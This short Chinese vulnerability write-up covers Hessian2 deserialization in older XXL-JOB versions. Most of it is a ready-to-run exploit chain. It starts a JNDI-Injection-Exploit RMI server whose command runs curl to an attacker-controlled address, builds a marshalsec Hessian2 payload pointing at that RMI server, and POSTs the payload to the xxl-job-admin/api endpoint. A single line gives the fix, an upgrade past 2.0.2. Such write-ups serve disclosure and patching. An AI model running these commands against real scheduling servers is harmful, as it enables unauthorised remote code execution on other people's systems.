### 一 漏洞描述
XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。  
现已开放源代码并接入多家公司线上产品线，开箱即用。  
xxl-job低版本api接口存在Hessian2反序列化，可以直接攻击调度中心.

### 二 漏洞利用
1.开启RMI服务
![img.png](img.png)
`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C "curl [Address]:5555"`

使用最后一个

2.生成Payload
`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor rmi://[RMI Address]:1099/stbjir >test.ser`

3.使用Payload
`curl -XPOST -H "Content-Type: x-application/hessian" --data-binary @test.ser http://localhost:8080/xxl-job-admin/api`

### 三 漏洞修复
升级>2.0.2

> 参考链接  
> https://www.cnblogs.com/liangzai6/p/14093411.html  
> https://xz.aliyun.com/t/8456  
> 官方文档: https://www.xuxueli.com/xxl-job/
